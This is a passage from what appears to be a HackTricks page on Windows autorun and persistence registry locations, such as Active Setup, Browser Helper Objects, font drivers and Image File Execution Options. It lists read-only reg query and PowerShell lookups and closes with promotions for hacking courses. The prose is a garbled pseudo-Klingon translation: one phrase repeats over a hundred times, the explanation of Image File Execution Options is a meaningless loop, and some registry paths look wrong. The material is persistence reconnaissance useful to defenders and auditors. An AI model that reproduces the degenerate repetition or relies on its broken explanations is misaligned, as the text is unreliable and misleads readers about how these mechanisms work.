Active Setup jen WindowsDaq **desktop mu'tlheghmeyDaq lo'laHbe'chugh**. 'ej, user logon jatlhlaHbe'chugh, 'ej, Run registry sections, RunOnce registry sections, Hoch entries, Hoch entries, Hoch entries, Hoch entries, Hoch entries, Hoch entries, Hoch entries, Hoch entries, Hoch entries, Hoch entries, Hoch entries, Hoch entries, Hoch entries, Hoch entries, Hoch entries, Hoch entries, Hoch entries, Hoch entries, Hoch entries, Hoch entries, Hoch entries, Hoch entries, Hoch entries, Hoch entries, Hoch entries, Hoch entries, Hoch entries, Hoch entries, Hoch entries, Hoch entries, Hoch entries, Hoch entries, Hoch entries, Hoch entries, Hoch entries, Hoch entries, Hoch entries, Hoch entries, Hoch entries, Hoch entries, Hoch entries, Hoch entries, Hoch entries, Hoch entries, Hoch entries, Hoch entries, Hoch entries, Hoch entries, Hoch entries, Hoch entries, Hoch entries, Hoch entries, Hoch entries, Hoch entries, Hoch entries, Hoch entries, Hoch entries, Hoch entries, Hoch entries, Hoch entries, Hoch entries, Hoch entries, Hoch entries, Hoch entries, Hoch entries, Hoch entries, Hoch entries, Hoch entries, Hoch entries, Hoch entries, Hoch entries, Hoch entries, Hoch entries, Hoch entries, Hoch entries, Hoch entries, Hoch entries, Hoch entries, Hoch entries, Hoch entries, Hoch entries, Hoch entries, Hoch entries, Hoch entries, Hoch entries, Hoch entries, Hoch entries, Hoch entries, Hoch entries, Hoch entries, Hoch entries, Hoch entries, Hoch entries, Hoch entries, Hoch entries, Hoch entries, Hoch entries, Hoch entries, Hoch entries, Hoch entries,
```bash
reg query "HKLM\SOFTWARE\Microsoft\Active Setup\Installed Components" /s /v StubPath
reg query "HKCU\SOFTWARE\Microsoft\Active Setup\Installed Components" /s /v StubPath
reg query "HKLM\SOFTWARE\Wow6432Node\Microsoft\Active Setup\Installed Components" /s /v StubPath
reg query "HKCU\SOFTWARE\Wow6432Node\Microsoft\Active Setup\Installed Components" /s /v StubPath
```
### Browser Helper Objects

### Overview of Browser Helper Objects (BHOs)

Browser Helper Objects (BHOs) are DLL modules that add extra features to Microsoft's Internet Explorer. They load into Internet Explorer and Windows Explorer on each start. Yet, their execution can be blocked by setting **NoExplorer** key to 1, preventing them from loading with Windows Explorer instances.

BHOs are compatible with Windows 10 via Internet Explorer 11 but are not supported in Microsoft Edge, the default browser in newer versions of Windows.

To explore BHOs registered on a system, you can inspect the following registry keys:

- `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Browser Helper Objects`
- `HKLM\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Explorer\Browser Helper Objects`

Each BHO is represented by its **CLSID** in the registry, serving as a unique identifier. Detailed information about each CLSID can be found under `HKLM\SOFTWARE\Classes\CLSID\{<CLSID>}`.

For querying BHOs in the registry, these commands can be utilized:
```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Browser Helper Objects" /s
reg query "HKLM\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Explorer\Browser Helper Objects" /s
```
### Internet Explorer Extensions

* `HKLM\Software\Microsoft\Internet Explorer\Extensions`
* `HKLM\Software\Wow6432Node\Microsoft\Internet Explorer\Extensions`

ghobe' registry 1 new registry per each dll 'ej 'oH **CLSID** DaH jatlhqa' 'e' vItlhutlh 'e' `HKLM\SOFTWARE\Classes\CLSID\{<CLSID>}`

### Font Drivers

* `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Font Drivers`
* `HKLM\SOFTWARE\WOW6432Node\Microsoft\Windows NT\CurrentVersion\Font Drivers`
```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Font Drivers"
reg query "HKLM\SOFTWARE\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Font Drivers"
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Font Drivers'
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Font Drivers'
```
### Qap QIn

* `HKLM\SOFTWARE\Classes\htmlfile\shell\open\command`
* `HKLM\SOFTWARE\Wow6432Node\Classes\htmlfile\shell\open\command`
```bash
reg query "HKLM\SOFTWARE\Classes\htmlfile\shell\open\command" /v ""
reg query "HKLM\SOFTWARE\Wow6432Node\Classes\htmlfile\shell\open\command" /v ""
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Classes\htmlfile\shell\open\command' -Name ""
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Wow6432Node\Classes\htmlfile\shell\open\command' -Name ""
```
### Image File Execution Options

#### tlhIngan Hol:

#### QaH:

Image File Execution Options (IFEO) jatlh 'e' yIDel. 'oH 'e' yIDel 'ej 'oH 'e' yIDel. 'oH 'e' yIDel 'ej 'oH 'e' yIDel. 'oH 'e' yIDel 'ej 'oH 'e' yIDel. 'oH 'e' yIDel 'ej 'oH 'e' yIDel. 'oH 'e' yIDel 'ej 'oH 'e' yIDel. 'oH 'e' yIDel 'ej 'oH 'e' yIDel. 'oH 'e' yIDel 'ej 'oH 'e' yIDel. 'oH 'e' yIDel 'ej 'oH 'e' yIDel. 'oH 'e' yIDel 'ej 'oH 'e' yIDel. 'oH 'e' yIDel 'ej 'oH 'e' yIDel. 'oH 'e' yIDel 'ej 'oH 'e' yIDel. 'oH 'e' yIDel 'ej 'oH 'e' yIDel. 'oH 'e' yIDel 'ej 'oH 'e' yIDel. 'oH 'e' yIDel 'ej 'oH 'e' yIDel. 'oH 'e' yIDel 'ej 'oH 'e' yIDel. 'oH 'e' yIDel 'ej 'oH 'e' yIDel. 'oH 'e' yIDel 'ej 'oH 'e' yIDel. 'oH 'e' yIDel 'ej 'oH 'e' yIDel. 'oH 'e' yIDel 'ej 'oH 'e' yIDel. 'oH 'e' yIDel 'ej 'oH 'e' yIDel. 'oH 'e' yIDel 'ej 'oH 'e' yIDel. 'oH 'e' yIDel 'ej 'oH 'e' yIDel. 'oH 'e' yIDel 'ej 'oH 'e' yIDel. 'oH 'e' yIDel 'ej 'oH 'e' yIDel. 'oH 'e' yIDel 'ej 'oH 'e' yIDel. 'oH 'e' yIDel 'ej 'oH 'e' yIDel. 'oH 'e' yIDel 'ej 'oH 'e' yIDel. 'oH 'e' yIDel 'ej 'oH 'e' yIDel. 'oH 'e' yIDel 'ej 'oH 'e' yIDel. 'oH 'e' yIDel 'ej 'oH 'e' yIDel. 'oH 'e' yIDel 'ej 'oH 'e' yIDel. 'oH 'e' yIDel 'ej 'oH 'e' yIDel. 'oH 'e' yIDel 'ej 'oH 'e' yIDel. 'oH 'e' yIDel 'ej 'oH 'e' yIDel. 'oH 'e' yIDel 'ej 'oH 'e' yIDel. 'oH 'e' yIDel 'ej 'oH 'e' yIDel. 'oH 'e' yIDel 'ej 'oH 'e' yIDel. 'oH 'e' yIDel 'ej 'oH 'e' yIDel. 'oH 'e' yIDel 'ej 'oH 'e' yIDel. 'oH 'e' yIDel 'ej 'oH 'e' yIDel. 'oH 'e' yIDel 'ej 'oH 'e' yIDel. 'oH 'e' yIDel 'ej 'oH 'e' yIDel. 'oH 'e' yIDel 'ej 'oH 'e' yIDel. 'oH 'e' yIDel 'ej 'oH 'e' yIDel. 'oH 'e' yIDel 'ej 'oH 'e' yIDel. 'oH 'e' yIDel 'ej 'oH 'e' yIDel. 'oH 'e' yIDel 'ej 'oH 'e' yIDel. 'oH 'e' yIDel 'ej 'oH 'e' yIDel. 'oH 'e' yIDel 'ej 'oH 'e' yIDel. 'oH 'e' yIDel 'ej 'oH 'e' yIDel. 'oH 'e' yIDel 'ej 'oH 'e' yIDel. 'oH 'e' yIDel 'ej 'oH 'e' yIDel. 'oH 'e' yIDel 'ej 'oH 'e' yIDel. 'oH 'e' yIDel 'ej 'oH 'e' yIDel. 'oH 'e' yIDel 'ej 'oH 'e' yIDel. 'oH 'e' yIDel 'ej 'oH 'e' yIDel. 'oH 'e' yIDel 'ej 'oH 'e' yIDel. 'oH 'e' yIDel 'ej 'oH 'e' yIDel. 'oH 'e' yIDel 'ej 'oH 'e' yIDel. 'oH 'e' yIDel 'ej 'oH 'e' yIDel. 'oH 'e' yIDel 'ej 'oH 'e' yIDel. 'oH 'e' yIDel 'ej 'oH 'e' yIDel. 'oH 'e' yIDel 'ej 'oH 'e' yIDel. 'oH 'e' yIDel 'ej 'oH 'e' yIDel. 'oH 'e' yIDel 'ej 'oH 'e' yIDel. 'oH 'e' yIDel 'ej 'oH 'e' yIDel. 'oH 'e' yIDel 'ej 'oH 'e' yIDel. 'oH 'e' yIDel 'ej 'oH 'e' yIDel. 'oH 'e' yIDel 'ej 'oH 'e' yIDel. 'oH 'e' yIDel 'ej 'oH 'e' yIDel. 'oH 'e' yIDel 'ej 'oH 'e' yIDel. 'oH 'e' yIDel 'ej 'oH 'e' yIDel. 'oH 'e' yIDel 'ej 'oH 'e' yIDel. 'oH 'e' yIDel 'ej 'oH 'e' yIDel. 'oH 'e' yIDel 'ej 'oH 'e' yIDel. 'oH 'e' yIDel 'ej 'oH 'e' yIDel. 'oH 'e' yIDel 'ej 'oH 'e' yIDel. 'oH 'e' yIDel 'ej 'oH 'e' yIDel. 'oH 'e' yIDel 'ej 'oH 'e' yIDel. 'oH 'e' yIDel 'ej 'oH 'e' yIDel. 'oH 'e' yIDel 'ej 'oH 'e' yIDel. 'oH 'e' yIDel 'ej 'oH 'e' yIDel. 'oH 'e' yIDel 'ej 'oH 'e' yIDel. 'oH 'e' yIDel 'ej 'oH 'e' yIDel. 'oH 'e' yIDel 'ej 'oH 'e' yIDel. 'oH 'e' yIDel 'ej 'oH 'e' yIDel. 'oH 'e' yIDel 'ej 'oH 'e' yIDel. 'oH 'e' yIDel 'ej 'oH 'e' yIDel. 'oH 'e' yIDel 'ej 'oH 'e' yIDel. 'oH 'e' yIDel 'ej 'oH 'e' yIDel. 'oH 'e' yIDel 'ej 'oH 'e' yIDel. 'oH 'e' yIDel 'ej 'oH 'e' yIDel. 'oH 'e' yIDel 'ej 'oH 'e' yIDel. 'oH 'e' yIDel 'ej 'oH 'e' yIDel. 'oH 'e' yIDel 'ej 'oH 'e' yIDel. 'oH 'e' yIDel 'ej 'oH 'e' yIDel. 'oH 'e' yIDel 'ej 'oH 'e' yIDel. 'oH 'e' yIDel 'ej 'oH 'e' yIDel. 'oH 'e' yIDel 'ej 'oH 'e' yIDel. 'oH 'e' yIDel 'ej 'oH 'e' yIDel. 'oH 'e' yIDel 'ej 'oH 'e' yIDel. 'oH 'e' yIDel 'ej 'oH 'e' yIDel. 'oH 'e' yIDel 'ej 'oH 'e' yIDel. 'oH 'e' yIDel 'ej 'oH 'e' yIDel. 'oH 'e' yIDel 'ej 'oH 'e' yIDel. 'oH 'e' yIDel 'ej 'oH 'e' yIDel. 'oH 'e' yIDel 'ej 'oH 'e' yIDel. 'oH 'e' yIDel 'ej 'oH 'e' yIDel. 'oH 'e' yIDel 'ej 'oH 'e' yIDel. 'oH 'e' yIDel 'ej 'oH 'e' yIDel. 'oH 'e' yIDel 'ej 'oH 'e' yIDel. 'oH 'e' yIDel 'ej 'oH 'e' yIDel. 'oH 'e' yIDel 'ej 'oH 'e' yIDel. 'oH 'e' yIDel 'ej 'oH 'e' yIDel. 'oH 'e' yIDel 'ej 'oH 'e' yIDel. 'oH 'e' yIDel 'ej 'oH 'e' yIDel. 'oH 'e' yIDel 'ej 'oH 'e' yIDel. 'oH 'e' yIDel 'ej 'oH 'e' yIDel. 'oH 'e' yIDel 'ej 'oH 'e' yIDel. 'oH 'e' yIDel 'ej 'oH 'e' yIDel. 'oH 'e' yIDel 'ej 'oH 'e' yIDel. 'oH 'e' yIDel 'ej 'oH 'e' yIDel. 'oH 'e' yIDel 'ej 'oH 'e' yIDel. 'oH 'e' yIDel 'ej 'oH 'e' yIDel. 'oH 'e' yIDel 'ej 'oH 'e' yIDel. 'oH 'e' yIDel 'ej 'oH 'e' yIDel. 'oH 'e' yIDel 'ej 'oH 'e' yIDel. 'oH 'e' yIDel 'ej 'oH 'e' yIDel. 'oH 'e' yIDel 'ej 'oH 'e' yIDel. 'oH 'e' yIDel 'ej 'oH 'e' yIDel. 'oH 'e' yIDel 'ej 'oH 'e' yIDel. 'oH 'e' yIDel 'ej 'oH 'e' yIDel. 'oH 'e' yIDel 'ej 'oH 'e' yIDel. 'oH 'e' yIDel 'ej 'oH 'e' yIDel. 'oH 'e' yIDel 'ej 'oH 'e' yIDel. 'oH 'e' yIDel 'ej 'oH 'e' yIDel. 'oH 'e' yIDel 'ej 'oH 'e' yIDel. 'oH 'e' yIDel 'ej 'oH 'e' yIDel. 'oH 'e' yIDel 'ej 'oH 'e' yIDel. 'oH 'e' yIDel 'ej 'oH 'e' yIDel. 'oH 'e' yIDel 'ej 'oH 'e' yIDel. 'oH 'e' yIDel 'ej 'oH 'e' yIDel. 'oH 'e' yIDel 'ej 'oH 'e' yIDel. 'oH 'e' yIDel 'ej 'oH 'e' yIDel. 'oH 'e' yIDel 'ej 'oH 'e' yIDel. 'oH 'e' yIDel 'ej 'oH 'e' yIDel. 'oH 'e' yIDel 'ej 'oH 'e' yIDel. 'oH 'e' yIDel 'ej 'oH 'e' yIDel. 'oH 'e' yIDel 'ej 'oH 'e' yIDel. 'oH 'e' yIDel 'ej 'oH 'e' yIDel. 'oH 'e' yIDel 'ej 'oH 'e' yIDel. 'oH 'e' yIDel 'ej 'oH 'e' yIDel. 'oH 'e' yIDel 'ej 'oH 'e' yIDel. 'oH 'e' yIDel 'ej 'oH 'e' yIDel. 'oH 'e' yIDel 'ej 'oH 'e' yIDel. 'oH 'e' yIDel 'ej 'oH 'e' yIDel. 'oH 'e' yIDel 'ej 'oH 'e' yIDel. 'oH 'e' yIDel 'ej 'oH 'e' yIDel. 'oH 'e' yIDel 'ej 'oH 'e' yIDel. 'oH 'e' yIDel 'ej 'oH 'e' yIDel. 'oH 'e' yIDel 'ej 'oH 'e' yIDel. 'oH 'e' yIDel 'ej 'oH 'e' yIDel. 'oH 'e' yIDel 'ej 'oH 'e' yIDel. 'oH 'e' yIDel 'ej 'oH 'e' yIDel. 'oH 'e' yIDel 'ej 'oH 'e' yIDel. 'oH 'e' yIDel 'ej 'oH 'e' yIDel. 'oH 'e' yIDel 'ej 'oH 'e' yIDel. 'oH 'e' yIDel 'ej 'oH 'e' yIDel. 'oH 'e' yIDel 'ej 'oH 'e' yIDel. 'oH 'e' yIDel 'ej 'oH 'e' yIDel. 'oH 'e' yIDel 'ej 'oH 'e' yIDel. 'oH 'e' yIDel 'ej 'oH 'e' yIDel. 'oH 'e' yIDel 'ej 'oH 'e' yIDel. 'oH 'e' yIDel 'ej 'oH 'e' yIDel. 'oH 'e' yIDel 'ej 'oH 'e' yIDel. 'oH 'e' yIDel 'ej 'oH 'e' yIDel. 'oH 'e' yIDel 'ej 'oH 'e' yIDel. 'oH 'e' yIDel 'ej 'oH 'e' yIDel. 'oH 'e' yIDel 'ej 'oH 'e' yIDel. 'oH 'e' yIDel 'ej 'oH 'e' yIDel. 'oH 'e' yIDel 'ej 'oH 'e' yIDel. 'oH 'e' yIDel 'ej 'oH 'e' yIDel. 'oH 'e' yIDel 'ej 'oH 'e' yIDel. 'oH 'e' yIDel 'ej 'oH 'e' yIDel. 'oH 'e' yIDel 'ej 'oH 'e' yIDel. '
```
HKLM\Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options
HKLM\Software\Microsoft\Wow6432Node\Windows NT\CurrentVersion\Image File Execution Options
```
## SysInternals

**ghItlhvam** that all the sites where you can find autoruns are **tlhInganpu'** [**winpeas.exe**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS/winPEASexe). However, for a **more comprehensive list of auto-executed** file you could use [autoruns ](https://docs.microsoft.com/en-us/sysinternals/downloads/autoruns)from systinternals:
```
autorunsc.exe -m -nobanner -a * -ct /accepteula
```
## More

**QaStaHvIS 'ej registries vItlhutlhlaH Autoruns vItlhutlh. [https://www.microsoftpressstore.com/articles/article.aspx?p=2762082\&seqNum=2](https://www.microsoftpressstore.com/articles/article.aspx?p=2762082\&seqNum=2)**

## References

* [https://resources.infosecinstitute.com/common-malware-persistence-mechanisms/#gref](https://resources.infosecinstitute.com/common-malware-persistence-mechanisms/#gref)
* [https://attack.mitre.org/techniques/T1547/001/](https://attack.mitre.org/techniques/T1547/001/)
* [https://www.microsoftpressstore.com/articles/article.aspx?p=2762082\&seqNum=2](https://www.microsoftpressstore.com/articles/article.aspx?p=2762082\&seqNum=2)
* [https://www.itprotoday.com/cloud-computing/how-can-i-add-boot-option-starts-alternate-shell](https://www.itprotoday.com/cloud-computing/how-can-i-add-boot-option-starts-alternate-shell)

<img src="../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt="" data-size="original">

vaj 'oH **hacking career** 'ej hack 'e' vItlhutlh - **jImej!** (_fluent polish written and spoken required_).

{% embed url="https://www.stmcyber.com/careers" %}

<details>

<summary><strong>Learn AWS hacking from zero to hero with</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Other ways to support HackTricks:

* If you want to see your **company advertised in HackTricks** or **download HackTricks in PDF** Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Share your hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
